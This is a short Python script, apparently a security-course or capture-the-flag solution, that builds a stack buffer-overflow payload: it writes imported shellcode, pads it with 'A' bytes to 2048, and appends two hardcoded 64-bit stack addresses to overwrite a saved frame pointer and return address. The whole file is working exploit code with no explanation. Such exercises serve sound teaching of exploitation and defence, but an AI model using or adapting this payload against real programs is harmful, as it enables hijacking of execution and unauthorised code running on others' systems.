#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*(2048-len(shellcode)))
sys.stdout.buffer.write(0x00007FFFFFF68DB0.to_bytes(8,'little'))
sys.stdout.buffer.write(0x7ffffff695c8.to_bytes(8,'little'))